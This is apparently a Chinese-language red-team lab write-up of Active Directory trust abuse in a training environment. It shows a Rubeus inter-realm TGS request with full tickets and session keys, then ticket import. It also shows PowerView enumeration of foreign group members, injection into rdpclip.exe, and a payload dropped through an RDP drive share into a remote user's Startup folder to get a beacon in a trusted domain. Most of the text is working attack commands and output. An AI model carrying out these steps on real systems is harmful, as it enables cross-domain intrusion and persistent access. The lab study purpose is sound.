  StartTime                :  8/23/2022 11:29:16 PM
  EndTime                  :  8/24/2022 9:29:16 AM
  RenewTill                :  8/30/2022 11:29:16 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jLZe4dgsRd3TeNKzqydFEpGOTUWaQweZeogXCh0RUVg=
  ASREP (key)              :  178AAEA34E7C37D77FDE27E2DA34E6311BD0AC609C871B925A53BDC69E832A52



```

1661297512426.png

根据tgt，请求外域```subsidiary.external```请求tgs


```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFhDCCBYCgAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBCowggQmoAMCARKhAwIBAqKCBBgEggQUWdzG75AaeQRyixDkkkIkAdYD4EzJtRO53FCGE5rJZdKAHAC0WkV0x5qKlZ39l8IOMF9dLXET0GHJb+V0MWPqwCDF7+RimjqUGHn5/WTXCHZZJNA8XcbDCchD6+JbXXAJhlUnQBoi19/rZKmwmpqvyguRBjwoOW3gp9lksoTjdW9ds8onu57PyjI8su2lZj4/j2X4ds+DNKdXS3JXDc+MDkERoL4PcoQtFyF3yG78cnZZtR9uVxzdtfFaIkJBDCMnX3C3blaVKWYe6nbzE98Ukm/L4hYUNKH47pLr5yUuUx98FCUhQagQuTrKZe8t5p7IQtlhQJeF2Z+sEcQwxYU3NY0avINMQFPyI4HpAXEphZ4OEQ15yVNbS7MZMyh1p/2Q6MpDDiLrcrWEbpya6g8Q9l8+uzw8whZSfgss2gcx92x2RSTkDvIcyUgxsm2U7eNm9L3cwEMyb70bldEFRjapg0mfE308GC4TO1zPB3pFf6ew49Ih1aPGpCKUs6QiEeS0zashKKv1KNlteulMVOl6HOvJnjNwweRYlp2/rDcycAPCC1h4odLoXSuBDuqDQ/UwVa31Uj4PuSxDRfpT8Iutw24ExFgeq94Ww6g+OsrWkLTwwCpYw+Lh5sG73MjFr/NILtGucKwMoNPi7jro34XsSVP6gDI+q80JhAGzgFmLd0itVYvFVxdtkzHAokH1Jyk8PLz1DpJREKXBSh932Q2nsGR4ieYB09H0nIBt1Xc1XYDDYDbbBUqqz5Nf+hpT3fCqqNplELKbWFpDlWnWSyFYTnaNBy/zM875ZPlAzpvVvhpLpVIlJg9fFqch5v53DW9hNGiOU40qqrHIb3iPdl3GoSpaDDTbColTdtrW+6Rn45uQCnNzTLo4jZ7G6iPx8yTNcIaBROezXB3G1ShMwIceMATTaCt4GqJcqDPBSqG+C3Y8chHxzwIQuQH5gvhDw1VRCJUnIRqOmoRg9D2Md+QGoPt+9UotN8VvSdzcVLO8FHYn5xsjcHt2x5Uu0IT9LnHat3PtaBLjAXrFEBdllc01NJ6r41UNXMlJhDTcCFQFIfgCuPA95QxPtfm8d4Yx27joZtc/h0txpIjPQ68qpS4QEq54kMNWZHy6zd8Lt/qOhDBiC31pXjofi46gpiX12TzuhaOy3wwd4L05juuKeuKC13qQvq6qZ52rom7SfsYI05r4HOc+3oyyfBqIR4VwGg0fb+zNb0wJn/R1ioLWTQpkTTx/OFwurzqi24Z95MTtoJrvM0DA5kLd70RhMWVW/Q3Pz4+s+BMm4IY7JAK+T1McuXg+VBjdDADgxzWzH5V0AiAGzvw9oWWHpT+YZSqACXuQfm3XMac4c5yT/p1ZlLR5aUsMa4LUSZPzSWRrLK/WCXYCOHnko4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQgjLZe4dgsRd3TeNKzqydFEpGOTUWaQweZeogXCh0RUVihExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEDhAAClERgPMjAyMjA4MjMyMzI5MTZaphEYDzIwMjIwODI0MDkyOTE2WqcRGA8yMDIyMDgzMDIzMjkxNlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFhDCCBYCgAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBCowggQmoAMCARKhAwIBAqKCBBgEggQUWdzG75AaeQRyixDkkkIkAdYD4EzJtRO53FCGE5rJZdKAHAC0WkV0x5qKlZ39l8IOMF9dLXET0GHJb+V0MWPqwCDF7+RimjqUGHn5/WTXCHZZJNA8XcbDCchD6+JbXXAJhlUnQBoi19/rZKmwmpqvyguRBjwoOW3gp9lksoTjdW9ds8onu57PyjI8su2lZj4/j2X4ds+DNKdXS3JXDc+MDkERoL4PcoQtFyF3yG78cnZZtR9uVxzdtfFaIkJBDCMnX3C3blaVKWYe6nbzE98Ukm/L4hYUNKH47pLr5yUuUx98FCUhQagQuTrKZe8t5p7IQtlhQJeF2Z+sEcQwxYU3NY0avINMQFPyI4HpAXEphZ4OEQ15yVNbS7MZMyh1p/2Q6MpDDiLrcrWEbpya6g8Q9l8+uzw8whZSfgss2gcx92x2RSTkDvIcyUgxsm2U7eNm9L3cwEMyb70bldEFRjapg0mfE308GC4TO1zPB3pFf6ew49Ih1aPGpCKUs6QiEeS0zashKKv1KNlteulMVOl6HOvJnjNwweRYlp2/rDcycAPCC1h4odLoXSuBDuqDQ/UwVa31Uj4PuSxDRfpT8Iutw24ExFgeq94Ww6g+OsrWkLTwwCpYw+Lh5sG73MjFr/NILtGucKwMoNPi7jro34XsSVP6gDI+q80JhAGzgFmLd0itVYvFVxdtkzHAokH1Jyk8PLz1DpJREKXBSh932Q2nsGR4ieYB09H0nIBt1Xc1XYDDYDbbBUqqz5Nf+hpT3fCqqNplELKbWFpDlWnWSyFYTnaNBy/zM875ZPlAzpvVvhpLpVIlJg9fFqch5v53DW9hNGiOU40qqrHIb3iPdl3GoSpaDDTbColTdtrW+6Rn45uQCnNzTLo4jZ7G6iPx8yTNcIaBROezXB3G1ShMwIceMATTaCt4GqJcqDPBSqG+C3Y8chHxzwIQuQH5gvhDw1VRCJUnIRqOmoRg9D2Md+QGoPt+9UotN8VvSdzcVLO8FHYn5xsjcHt2x5Uu0IT9LnHat3PtaBLjAXrFEBdllc01NJ6r41UNXMlJhDTcCFQFIfgCuPA95QxPtfm8d4Yx27joZtc/h0txpIjPQ68qpS4QEq54kMNWZHy6zd8Lt/qOhDBiC31pXjofi46gpiX12TzuhaOy3wwd4L05juuKeuKC13qQvq6qZ52rom7SfsYI05r4HOc+3oyyfBqIR4VwGg0fb+zNb0wJn/R1ioLWTQpkTTx/OFwurzqi24Z95MTtoJrvM0DA5kLd70RhMWVW/Q3Pz4+s+BMm4IY7JAK+T1McuXg+VBjdDADgxzWzH5V0AiAGzvw9oWWHpT+YZSqACXuQfm3XMac4c5yT/p1ZlLR5aUsMa4LUSZPzSWRrLK/WCXYCOHnko4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQgjLZe4dgsRd3TeNKzqydFEpGOTUWaQweZeogXCh0RUVihExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEDhAAClERgPMjAyMjA4MjMyMzI5MTZaphEYDzIwMjIwODI0MDkyOTE2WqcRGA8yMDIyMDgzMDIzMjkxNlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP /nowrap
[+] host called home, sent: 589259 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGS


[+] received output:
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/subsidiary.external'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEXzCCBFthggRXMIIEU6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoigwJqADAgECoR8wHRsGa3JidGd0GxNTVUJTSURJQVJZLkVYVEVSTkFMo4IECzCCBAegAwIBF6EDAgEIooID+QSCA/VlenEMveZmYHOMCkPy7+gEb3dzOgwoBjg0RcvucpglTynEDzzTcrseOWc5xAR77o9lID9V+7yIXvpwmdvbBnY3lcx+73RpyaU1Y5niK6VGZ+4+VDSyrqm6B1jsn5NP8dpiMwKKUMd6VLmNPZU32/pVEunUNRVwzGdiR9eMlriFPR8HBiMU9lwt5rcr83WUDHycEmilZ3Jacb5LUkwbVGiigE44nVmEdkBHopiMuI+6UTcBk5r5+RavAbvzgX7I0U9rKatiKGWab/TQ2l/gwrscR2+t5XXxxC9AU9rwXm9VKxz0ED8Ww4zg+jZdLvHCy7NnKbOJ//ii9f2sTZWR3odMqoWp12YNXhq6JVrimdiPbdk68JwyHWaGgRWsIEXiW190E3XSQbnktRJxwADqLZl3MkpnKtk+FuIMhKIvsxN73oss9kEsa4beal4nypx6nWTXEZkmZkocRAiSewmDSV+MuqBoeM7+dgm+Jd+La57wyiMCnaLrVFsOVJD6EqXXBqlBZGY/eqg2D8j1iewwNbfZksSJCPKWe292Qjo/XaEOT+KWkP2ePBejFfADgIR1jbitQU85I1Ird1pe3cxFYwmIRkQLtc3fyyUSA+x5BgLm2+GQS3VvF7n3Sd93tuWPmw4q3/+aCxuagdQ2k2DtApRhhncW0KDa7UDm2COn4ag6vqWlKDj3wI9THOrDcj21n9b5SnY/X/Mrd/iXoXfmBsuCX6wEqZMLnMq52B+7SidkQiFBn34G49xwMn4T73jOWwUAWZJqDmRsZvd6cWI4Fo0AT3qf6Jha1SmWWaycKxSwrXXfhjorc/SaOemuPFTHbPy2zURn9Uj8C3bbNMYSabwohkjde49MjkRWSShHxAS17GU6j6nrPgn/C3zJdaBIVlt3CRDxr2Dj1rWUbb2mBC6lHIgh2RUGeyLYli2++fhlyZlz90KTd5Z/nN86vq4Z1kLtjs0c3DzV5X1bF1czVshauY8ZlX22/qm1BripmItO8UE5/JEN8vvyIaSKw7cJam6qPvwM7rP54Sc/2ORkDOXVatYA7EMMBoZI7NYAQIg/eGYJM+3t3OITEV07duB8B+ZDDbKYD8fLkCwg+CxfdD7fO0xrcqIkSGdNJWaC4Gata8axy+l16xn51fywObHorw7oKuh+dGkXsuj8hNnSyfVWoy+XXYHr1ArBnj0RwabsFsQdgXD82YWQOf4ZW2PZwV/A8+p5pE5pfbYKUp8lXWrS2tafmGOVBhFRCdwaxK1Aj7+1UpwoUVSGMKtn9ltENq40nzkTxTU8nuljRYoQRepsJ0gUtFxhbTswJVTtJBoJxSfA8L5jbMLlK2dqAl11eWAuWG+0vKOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEJZEZplTsSZIH+hrWIRjwUmhExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEAhAAClERgPMjAyMjA4MjMyMzMwMTRaphEYDzIwMjIwODI0MDkyOTE2WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6koMCagAwIBAqEfMB0bBmtyYnRndBsTU1VCU0lESUFSWS5FWFRFUk5BTA==

  ServiceName              :  krbtgt/SUBSIDIARY.EXTERNAL
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jadams
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  8/23/2022 11:30:14 PM
  EndTime                  :  8/24/2022 9:29:16 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  lkRmmVOxJkgf6GtYhGPBSQ==



```

1661297551940.png


制作票据

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("doIFRjCCBUKgAwIBBaEDAgEWooIEXzCCBFthggRXMIIEU6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoigwJqADAgECoR8wHRsGa3JidGd0GxNTVUJTSURJQVJZLkVYVEVSTkFMo4IECzCCBAegAwIBF6EDAgEIooID+QSCA/VlenEMveZmYHOMCkPy7+gEb3dzOgwoBjg0RcvucpglTynEDzzTcrseOWc5xAR77o9lID9V+7yIXvpwmdvbBnY3lcx+73RpyaU1Y5niK6VGZ+4+VDSyrqm6B1jsn5NP8dpiMwKKUMd6VLmNPZU32/pVEunUNRVwzGdiR9eMlriFPR8HBiMU9lwt5rcr83WUDHycEmilZ3Jacb5LUkwbVGiigE44nVmEdkBHopiMuI+6UTcBk5r5+RavAbvzgX7I0U9rKatiKGWab/TQ2l/gwrscR2+t5XXxxC9AU9rwXm9VKxz0ED8Ww4zg+jZdLvHCy7NnKbOJ//ii9f2sTZWR3odMqoWp12YNXhq6JVrimdiPbdk68JwyHWaGgRWsIEXiW190E3XSQbnktRJxwADqLZl3MkpnKtk+FuIMhKIvsxN73oss9kEsa4beal4nypx6nWTXEZkmZkocRAiSewmDSV+MuqBoeM7+dgm+Jd+La57wyiMCnaLrVFsOVJD6EqXXBqlBZGY/eqg2D8j1iewwNbfZksSJCPKWe292Qjo/XaEOT+KWkP2ePBejFfADgIR1jbitQU85I1Ird1pe3cxFYwmIRkQLtc3fyyUSA+x5BgLm2+GQS3VvF7n3Sd93tuWPmw4q3/+aCxuagdQ2k2DtApRhhncW0KDa7UDm2COn4ag6vqWlKDj3wI9THOrDcj21n9b5SnY/X/Mrd/iXoXfmBsuCX6wEqZMLnMq52B+7SidkQiFBn34G49xwMn4T73jOWwUAWZJqDmRsZvd6cWI4Fo0AT3qf6Jha1SmWWaycKxSwrXXfhjorc/SaOemuPFTHbPy2zURn9Uj8C3bbNMYSabwohkjde49MjkRWSShHxAS17GU6j6nrPgn/C3zJdaBIVlt3CRDxr2Dj1rWUbb2mBC6lHIgh2RUGeyLYli2++fhlyZlz90KTd5Z/nN86vq4Z1kLtjs0c3DzV5X1bF1czVshauY8ZlX22/qm1BripmItO8UE5/JEN8vvyIaSKw7cJam6qPvwM7rP54Sc/2ORkDOXVatYA7EMMBoZI7NYAQIg/eGYJM+3t3OITEV07duB8B+ZDDbKYD8fLkCwg+CxfdD7fO0xrcqIkSGdNJWaC4Gata8axy+l16xn51fywObHorw7oKuh+dGkXsuj8hNnSyfVWoy+XXYHr1ArBnj0RwabsFsQdgXD82YWQOf4ZW2PZwV/A8+p5pE5pfbYKUp8lXWrS2tafmGOVBhFRCdwaxK1Aj7+1UpwoUVSGMKtn9ltENq40nzkTxTU8nuljRYoQRepsJ0gUtFxhbTswJVTtJBoJxSfA8L5jbMLlK2dqAl11eWAuWG+0vKOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEJZEZplTsSZIH+hrWIRjwUmhExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEAhAAClERgPMjAyMjA4MjMyMzMwMTRaphEYDzIwMjIwODI0MDkyOTE2WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6koMCagAwIBAqEfMB0bBmtyYnRndBsTU1VCU0lESUFSWS5FWFRFUk5BTA=="))
```


 kerberos_ticket_use C:\Users\Administrator\Desktop\subsidiary.kirbi








# Outbound Trust

前提：如果域 A（cyberbotic.io） 信任域 B（zeropointsecurity.local），则域 B 中的用户可以访问域 A 中的资源，但域 A 中的用户不应该能够访问域 B 中的资源

利用原理：利用 RDP 驱动器共享技术

由于本域cyberbotic.io是单方面信任zeropointsecurity.local，所以本域不能搜索到zeropointsecurity.local的信息


但是可以查找本域中的外域组
```
beacon> powershell Get-DomainForeignGroupMember -Domain cyberbotic.io

GroupDomain             : cyberbotic.io
GroupName               : Jump Users
GroupDistinguishedName  : CN=Jump Users,CN=Users,DC=cyberbotic,DC=io
MemberDomain            : cyberbotic.io
MemberName              : S-1-5-21-3022719512-2989052766-178205875-1115
MemberDistinguishedName : CN=S-1-5-21-3022719512-2989052766-178205875-1115,CN=ForeignSecurityPrincipals,DC=cyberbotic,DC=io
```


查找jump users组可以登录的本域计算机
```
beacon> powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

上面查询的等价操作
```
beacon> powershell Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

这里表明Jump Users里面的用户（比如zeropointsecurity.local的jean.wise可以登录这两台计算机）

在sql01.zeropointsecurity.local，以jean.wise的身份登录sql-1.cyberbotic.io


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661307993881.jpg)


在sql-1，使用net logons查看登录session
```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
sql-1

beacon> net logons
[*] Tasked beacon to run net logons on localhost
[+] host called home, sent: 105059 bytes
[+] received output:
Logged on users at \\localhost:

ZPS\jean.wise
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
CYBER\SQL-1$
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308209479.png)

查看进程列表


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308247969.jpg)

注入rdpclip.exe这个进程


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308385718.png)

拿到beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308458491.jpg)

在sql-1用system的beacon做一个pivot lisenter


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308533720.png)

生成一个payload


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308621315.png)

```
beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 174b     fil     05/15/2021 19:00:25   desktop.ini
 281kb    fil     05/15/2021 20:31:00   pivot.exe
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308876913.jpg)

在sql01.zeropointsecurity.local确认已上传


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661308836986.jpg)


重新登录sql01.zeropointsecurity.local，接收到beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661309056371.png)
